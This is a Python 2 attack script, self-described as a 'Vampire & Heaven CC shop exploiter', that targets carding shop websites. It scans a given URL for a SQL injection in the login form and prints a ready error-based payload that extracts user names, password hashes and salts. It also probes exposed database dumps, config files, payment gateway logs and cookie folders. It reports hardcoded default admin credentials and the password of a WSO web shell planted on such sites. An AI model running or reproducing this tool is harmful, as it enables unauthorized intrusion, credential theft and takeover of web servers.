import urllib
import argparse
from HTMLParser import HTMLParser

class MyHTMLParser(HTMLParser):
  	def handle_starttag(self, tag, attrs):
    		if tag == 'a':
 			for name, value in attrs:
				if name == "href":
					if value == "/":
						pass
					else:
						print "[+] Discovered link: " + value

htmlparse = MyHTMLParser()

def findSploit(domain,htmlparse):
	adminLog = []
	wsoUpload = []
	sqlInject = []
	sqlFiles = []
	paygateFiles= []
	cookieFiles = []
	sensitiveFiles = []
	print "\n[+] Scan for: " + domain + " has started."
	domain = "http://" + domain
	adminPages = ["/admin/", "/admin/c"]
	sqlDirs = ["/binbase.sql", "/scan/", "/scan/config.php", "/scan/sql.class.php", "/thuongtin_sellcc.sql", "/data.sql", "/sql.php", "/includes/", "/includes/mclass.dbs.php", "/includes/config.php", "/includes/dbconnect.php", "/includes/global.php", "/inc/", "/inc/x.htaccess", "/inc/sql.php", "/inc/config.php", "/inc/ez_sql_core.php", "/includes/mysql.class.php", "/includes/config.inc.php"]
	paygateDirs = ["/paygates/", "/paygates/LR_payment_paygate_log.txt", "/paygates/PM_payment_paygate_log.txt"]
	cookieDirs = ["/c/", "/checkers/cookie/", "/checkers/", "/cookie/", "/cookies/"]
	sensitiveDirs = ["/.htaccess", "/scan/", "/scan/20110326.txt"]
	print "[*] Scanning for SQL injection."
	resource = urllib.urlopen(domain)
	html = resource.read()
	if "txtUser" and "txtPass" and "security_code" in html:
		print "\n[+] Discovered SQL injection on index page (" + domain + ")."
		print domain + "/login.php [POST] -- Param: txtUser"
		print "\n[+] Exploit using:"
		print "'+or+1+group+by+concat_ws(0x7e,(select+concat(user_name,0x7e,user_pass,0x7e,user_salt,0x7e,user_groupid)+from+users+limit+0,1),floor(rand(0)*2))+having+min(0)+or+1-- x"
	print "\n[*] Scanning for SQL configs and databases."
	for sqlDir in sqlDirs:
		conn = urllib.urlopen(domain + sqlDir)
		resp = conn.getcode()
		if resp == 200:
			print domain + sqlDir
			html = conn.read()
			if "Index of" in html:
				print "\n[+] Open directory: " + domain + sqlDir
				if htmlparse.feed(html):
					for link in htmlparse.feed(html):
						print "\n[+] Discovered file: " + domain + sqlDir + link
	print "\n[*] Scanning for paygate logs."
	for paygateDir in paygateDirs:
		conn = urllib.urlopen(domain + paygateDir)
		resp = conn.getcode()
		if resp == 200:
			print domain + paygateDir
			html = conn.read()
			if "Index of" in html:
				print "\n[+] Open directory: " + domain + paygateDir
				if htmlparse.feed(html):
					for link in htmlparse.feed(html):
						print "\n[+] Discovered file: " + domain + paygateDir + link
	print "\n[*] Scanning for cookies."
	for cookieDir in cookieDirs:
		conn = urllib.urlopen(domain + cookieDir)
		resp = conn.getcode()
		if resp == 200:
			print domain + cookieDir
			html = conn.read()
			if "Index of" in html:
				print "\n[+] Open directory: " + domain + cookieDir
				if htmlparse.feed(html):
					for link in htmlparse.feed(html):
						print "\n[+] Discovered file: " + domain + cookieDir + link
	print "\n[*] Scanning for sensitive files."
	for sensitiveDir in sensitiveDirs:
		conn = urllib.urlopen(domain + sensitiveDir)
		resp = conn.getcode()
		if resp == 200:
			print domain + sensitiveDir
	uploadPage = "/review.php"
	conn = urllib.urlopen(domain + uploadPage)
	resp = conn.getcode()
	if resp == 200:
		print "\n[+] File Uploader discovered on: " + domain + uploadPage
	adminPages = ["/testcurl.php", "/sql.php", "/searchform.php", "/lr_success.php", "/functions.php", "/buycredit.php"]
	for adminPage in adminPages:
		conn = urllib.urlopen(domain + adminPage)
		resp = conn.getcode()
		if resp == 200:
			print "\n[+] Check the default admin login -> admin:demo123"
	wsoPages = ["/shop/usercheck.php", "/usercheck.php"]
	for wsoPage in wsoPages:
		conn = urllib.urlopen(domain + wsoPage)
		resp = conn.getcode()
		if resp == 200:
			print "\n[+] WSO shell discovered on: " + domain + wsoPage + " being password protected with \"kalnapilis7\""
	print "\n[+] Done!\n"

def main():
	usage='%(prog)s -u <url to attack>'
	parser = argparse.ArgumentParser(usage=usage,description='Vampire & Heaven CC shop exploiter')
	parser.add_argument('-u', '--url', action="store", dest="domain", help="URL of the targeted site", required=True)
	parser.add_argument('--shop', action="store_true", help="some domains have files in the folder \"shop\" so enable this if your domain is like that")
	results = parser.parse_args()
	domain = results.domain
	if results.shop:
		domain = domain + "/shop"
	print "\n[+] Scanning: " + domain
	findSploit(domain,htmlparse)

if __name__ == '__main__':
	main()
